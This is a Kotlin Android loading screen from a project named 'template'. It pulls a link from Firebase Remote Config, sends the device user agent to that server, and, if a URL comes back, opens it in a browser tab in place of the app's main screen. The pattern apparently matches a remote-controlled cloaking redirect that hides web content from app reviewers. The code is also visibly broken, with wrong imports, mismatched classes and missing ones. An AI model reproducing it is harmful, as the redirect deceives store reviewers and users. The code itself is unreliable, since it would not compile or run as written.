package com.template

import android.app.DownloadManager
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.telecom.Call
import android.widget.ProgressBar
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import com.google.android.gms.common.api.Response
import java.io.IOException
import javax.security.auth.callback.Callback

class LoadingActivity : AppCompatActivity() {
    private lateinit var progressBar: ProgressBar
    private lateinit var remoteConfig: FirebaseRemoteConfig

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)

        progressBar = findViewById(R.id.progress_bar)

        remoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(0)
            .build()
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.setDefaultsAsync(R.xml.remote_config_defaults)

        remoteConfig.fetchAndActivate()
            .addOnCompleteListener { task ->
                val checkLink = remoteConfig.getString("check_link")
                if (checkLink.isEmpty()) {
                    openMainActivity()
                } else {
                    val userAgent = System.getProperty("http.agent")
                    val link = "$checkLink&ua=$userAgent"
                    val client = OkHttpClient()
                    val request = DownloadManager.Request.Builder()
                        .url(link)
                        .build()
                    client.newCall(request).enqueue(object : Callback {
                        override fun onFailure(call: Call, e: IOException) {
                            openMainActivity()
                        }

                        override fun onResponse(call: Call, response: Response) {
                            val url = response.body()?.string()
                            if (response.code() == 403 || url.isNullOrEmpty()) {
                                openMainActivity()
                            } else {
                                saveDomain(url)
                                openWebActivity(url)
                            }
                        }
                    })
                }
            }
    }

    private fun openMainActivity() {
        val intent = Intent(this, MainActivity::class.java)
        startActivity(intent)
        finish()
    }

    private fun saveDomain(url: String) {
        val prefs = getPreferences(Context.MODE_PRIVATE)
        prefs.edit().putString("domain", url).apply()
    }

    private fun openWebActivity(url: String) {
        val intent = CustomTabsIntent.Builder()
            .setShowTitle(true)
            .build()
        intent.launchUrl(this, Uri.parse(url))
        finish()
    }
}